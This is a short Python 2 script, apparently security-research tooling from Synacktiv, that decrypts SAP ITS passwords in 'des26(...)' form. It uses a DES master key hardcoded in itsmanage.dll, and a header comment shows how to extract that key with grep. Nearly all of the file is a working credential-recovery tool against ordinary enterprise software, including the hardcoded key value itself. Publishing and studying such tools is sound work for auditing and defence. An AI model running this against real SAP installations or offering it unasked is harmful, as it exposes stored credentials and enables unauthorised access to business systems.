#!/usr/bin/env python

# Decrypt des26 encrypted SAP ITS passwords.
# the hardcoded key might be different for other versions of SAP ITS.
# to find the key, just use grep:
#	$ egrep -ao [0-9a-f]{16} itsmanage.dll 
#	0123456789abcdef
#	833de42f5166a1c2 <- the master key
#	833de42f5166a1c2
#	833de42f5166a1c2
#	833de42f5166a1c2
#	833de42f5166a1c2

# Eloi Vanderbeken - Synacktiv

# THIS SOFTWARE IS PROVIDED BY SYNACKTIV ''AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL SYNACKTIV BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.


from Crypto.Cipher import DES
import argparse
import re
HEXCHARS = set('0123456789abcdefABCDEF')

parser = argparse.ArgumentParser(description='Tool to decrypt des26 encrypted ITS passwords.')
parser.add_argument('password', type=str, help='password to decrypt: des26(0123456789abcdf)')
parser.add_argument('-c', '--cryptkey', type=str, default='', help='DES CryptKey used to encrypt passwords: 0102030405060708')
parser.add_argument('-k', '--hardcodedkey', type=str, default='833de42f5166a1c2', help='itsmanage.dll hardcoded DES key: 1112131415161718')
args = parser.parse_args()

assert args.password[:6]+args.password[-1] == 'des26()', \
	'Wrong password format'
assert args.cryptkey == '' or (len(args.cryptkey) == 16 and all(c in HEXCHARS for c in args.cryptkey)), \
	'Wrong CryptKey format'
assert len(args.hardcodedkey) == 16 and all(c in HEXCHARS for c in args.hardcodedkey), \
	'Wrong hardcoded key format'

encrypted_pass = args.password
encrypted_pass = encrypted_pass[6:-1].decode('hex')

hck = DES.new(args.hardcodedkey.decode('hex'), DES.MODE_ECB)
if args.cryptkey != '' :
	ck  = DES.new(args.cryptkey.decode('hex'), DES.MODE_ECB)
else :
	ck = None

password = hck.decrypt(encrypted_pass).rstrip('\x00')
if ck is not None :
	assert password[:6]+password[-1] == 'des26()', \
		'Wrong decrypted password format, wrong hardcoded key?'
	password = ck.decrypt(password[6:-1].decode('hex')).rstrip('\x00')
elif password[:6]+password[-1] == 'des26()' :
	print '/!\\ It seems that your password is encrypted with a CryptKey /!\\'
	print '(or this user uses strange passwords ;))'

print 'decrypted password:', password
